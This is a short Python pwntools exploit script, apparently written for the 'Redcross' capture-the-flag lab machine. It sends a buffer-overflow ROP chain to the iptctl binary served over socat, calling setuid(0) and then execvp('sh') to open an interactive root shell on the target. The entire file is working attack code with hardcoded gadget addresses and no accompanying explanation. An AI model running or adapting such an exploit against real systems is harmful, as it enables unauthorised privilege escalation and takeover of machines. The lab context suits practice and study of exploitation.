  1 #!/usr/bin/python
  2 # on redcross setup iptctl with socat listening on 9001
  3 # socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"
  4 
  5 from pwn import *
  6   7 
  8 # addresses
  9 execvp  = p64(0x400760) # execve plt
 10 setuid  = p64(0x400780) # setuid plt
 11 pop_rdi = p64(0x400de3) # pop rdi; ret
 12 pop_rsi = p64(0x400de1) # pop rsi; pop r15; retd
 13 sh_str  = p64(0x40046e) # "sh"
 14 
 15 #setup payload
 16 payload = "allow" +("A"*29)
 17 
 18 # setuid(0)
 19 payload += pop_rdi
 20 payload += p64(0)
 21 payload += setuid
 22 
 23 # execvp("sh", 0)
 24 payload += pop_rdi
 25 payload += sh_str
 26 payload += pop_rsi
 27 payload += p64(0)
 28 payload += p64(0)
 29 payload += execvp
 30 
 31 payload += "\n7.8.8.9\n"
 32 
 33 log.info("Attempting to connect")
 34 try:
 35     p = remote("10.10.10.113",9001)
 36 except pwnlib.exception.PwnlibException:
 37     log.warn("Could not connect to target")
 38     log.warn('Is socat running on target?')
 39     log.warn('TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i" running?')
 40     exit()
 41 p.sendline(payload)
 42 p.interactive() 
